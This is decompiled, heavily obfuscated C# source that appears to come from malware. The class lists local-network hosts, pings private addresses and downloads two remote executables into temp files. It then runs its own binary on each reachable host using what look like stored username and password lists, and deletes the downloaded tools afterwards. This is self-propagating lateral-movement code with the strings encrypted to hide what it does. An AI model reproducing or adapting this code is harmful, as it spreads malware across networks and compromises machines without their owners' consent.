using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

internal sealed class DeABvRArMCwB
{
	private sealed class aMrJXiTIwX
	{
		public string NsXGeDCCQTd;

		public string CMJyvSrwjHRT;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107354713)) && !string_0.StartsWith(getString_0(107354676)) && !string_0.StartsWith(getString_0(107354667)) && !string_0.Contains(getString_0(107358989))) || !fGUvONlGdRyR(string_0))
			{
				return;
			}
			if (WzLdBSYJOokD.gSZYfTdGNUKJ == getString_0(107396828))
			{
				for (int i = 0; i < YotnBHGefVNPo.Count; i++)
				{
					if (WzLdBSYJOokD.mEcZAOPRDbjI)
					{
						if (File.Exists(NsXGeDCCQTd))
						{
							WzLdBSYJOokD.cgSXEqOxPfYBfDJ(NsXGeDCCQTd, getString_0(107358282) + string_0 + getString_0(107367992) + YotnBHGefVNPo[i] + getString_0(107367951) + dQEnISRKEPfhe[i] + getString_0(107367942) + Assembly.GetEntryAssembly()!.Location + getString_0(107358300));
						}
					}
					else if (File.Exists(CMJyvSrwjHRT))
					{
						WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CMJyvSrwjHRT, getString_0(107358282) + string_0 + getString_0(107367992) + YotnBHGefVNPo[i] + getString_0(107367951) + dQEnISRKEPfhe[i] + getString_0(107367909) + Assembly.GetEntryAssembly()!.Location + getString_0(107358300));
					}
				}
			}
			else if (WzLdBSYJOokD.mEcZAOPRDbjI)
			{
				if (File.Exists(NsXGeDCCQTd))
				{
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(NsXGeDCCQTd, getString_0(107358282) + string_0 + getString_0(107367852) + Assembly.GetEntryAssembly()!.Location + getString_0(107358300));
				}
			}
			else if (File.Exists(CMJyvSrwjHRT))
			{
				WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CMJyvSrwjHRT, getString_0(107358282) + string_0 + getString_0(107367307) + Assembly.GetEntryAssembly()!.Location + getString_0(107358300));
			}
		}

		static aMrJXiTIwX()
		{
			Strings.CreateGetStringDelegate(typeof(aMrJXiTIwX));
		}
	}

	public static List<string> joygpGRbgwpfdmVAE;

	public static string NxxmpOGRaSTEuh;

	public static List<string> YotnBHGefVNPo;

	public static List<string> dQEnISRKEPfhe;

	public static List<string> WfKLlMbmrwf;

	public List<string> umzsYxniNZHO = new List<string>();

	public List<string> GdqYKnonGt = new List<string>();

	public List<string> wCexbsePkpWdWd = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void QvaFNauqvvmW()
	{
		aMrJXiTIwX CS_0024_003C_003E8__locals0 = new aMrJXiTIwX();
		WzLdBSYJOokD.CzxRPacJMGgzr();
		List<vZQDilsfLjWV> list = vZQDilsfLjWV.lzbYNESUUNngc();
		foreach (vZQDilsfLjWV item in list)
		{
			joygpGRbgwpfdmVAE.Add(item.IPAddress);
		}
		if (WzLdBSYJOokD.dDnkLavUJsMIO.Count > 0)
		{
			joygpGRbgwpfdmVAE = joygpGRbgwpfdmVAE.Union(WzLdBSYJOokD.dDnkLavUJsMIO).ToList();
		}
		CS_0024_003C_003E8__locals0.NsXGeDCCQTd = getString_0(107358986);
		CS_0024_003C_003E8__locals0.CMJyvSrwjHRT = getString_0(107358986);
		try
		{
			CS_0024_003C_003E8__locals0.NsXGeDCCQTd = JwOPyUrIwn();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.CMJyvSrwjHRT = ZPpeEKaUiWqk();
		}
		catch
		{
		}
		foreach (vZQDilsfLjWV item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107354710)) || item2.IPAddress.StartsWith(getString_0(107354673)) || item2.IPAddress.StartsWith(getString_0(107354664)) || item2.IPAddress.Contains(getString_0(107358986)))
				{
					XRqizikYVrmSDK.RCWktOIipob(item2.MacAddress, item2.IPAddress, getString_0(107367743));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(joygpGRbgwpfdmVAE, delegate(string string_0)
			{
				if ((string_0.StartsWith(aMrJXiTIwX.getString_0(107354713)) || string_0.StartsWith(aMrJXiTIwX.getString_0(107354676)) || string_0.StartsWith(aMrJXiTIwX.getString_0(107354667)) || string_0.Contains(aMrJXiTIwX.getString_0(107358989))) && fGUvONlGdRyR(string_0))
				{
					if (WzLdBSYJOokD.gSZYfTdGNUKJ == aMrJXiTIwX.getString_0(107396828))
					{
						for (int i = 0; i < YotnBHGefVNPo.Count; i++)
						{
							if (WzLdBSYJOokD.mEcZAOPRDbjI)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.NsXGeDCCQTd))
								{
									WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CS_0024_003C_003E8__locals0.NsXGeDCCQTd, aMrJXiTIwX.getString_0(107358282) + string_0 + aMrJXiTIwX.getString_0(107367992) + YotnBHGefVNPo[i] + aMrJXiTIwX.getString_0(107367951) + dQEnISRKEPfhe[i] + aMrJXiTIwX.getString_0(107367942) + Assembly.GetEntryAssembly()!.Location + aMrJXiTIwX.getString_0(107358300));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT))
							{
								WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT, aMrJXiTIwX.getString_0(107358282) + string_0 + aMrJXiTIwX.getString_0(107367992) + YotnBHGefVNPo[i] + aMrJXiTIwX.getString_0(107367951) + dQEnISRKEPfhe[i] + aMrJXiTIwX.getString_0(107367909) + Assembly.GetEntryAssembly()!.Location + aMrJXiTIwX.getString_0(107358300));
							}
						}
					}
					else if (WzLdBSYJOokD.mEcZAOPRDbjI)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.NsXGeDCCQTd))
						{
							WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CS_0024_003C_003E8__locals0.NsXGeDCCQTd, aMrJXiTIwX.getString_0(107358282) + string_0 + aMrJXiTIwX.getString_0(107367852) + Assembly.GetEntryAssembly()!.Location + aMrJXiTIwX.getString_0(107358300));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT))
					{
						WzLdBSYJOokD.cgSXEqOxPfYBfDJ(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT, aMrJXiTIwX.getString_0(107358282) + string_0 + aMrJXiTIwX.getString_0(107367307) + Assembly.GetEntryAssembly()!.Location + aMrJXiTIwX.getString_0(107358300));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.NsXGeDCCQTd))
			{
				File.Delete(CS_0024_003C_003E8__locals0.NsXGeDCCQTd);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT))
			{
				File.Delete(CS_0024_003C_003E8__locals0.CMJyvSrwjHRT);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string JwOPyUrIwn()
	{
		if (IntPtr.Size == 8)
		{
			return xffDmLRkUzjzyp(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367690))));
		}
		return xffDmLRkUzjzyp(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367690))));
	}

	public static string ZPpeEKaUiWqk()
	{
		if (IntPtr.Size == 8)
		{
			return xffDmLRkUzjzyp(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367641))));
		}
		return xffDmLRkUzjzyp(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368044))));
	}

	public static bool fGUvONlGdRyR(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string xffDmLRkUzjzyp(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107367971), getString_0(107358986)).Remove(0, 3) + getString_0(107367998);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static DeABvRArMCwB()
	{
		Strings.CreateGetStringDelegate(typeof(DeABvRArMCwB));
		joygpGRbgwpfdmVAE = new List<string>();
		NxxmpOGRaSTEuh = getString_0(107358986);
		YotnBHGefVNPo = new List<string>();
		dQEnISRKEPfhe = new List<string>();
		WfKLlMbmrwf = new List<string>();
	}
}
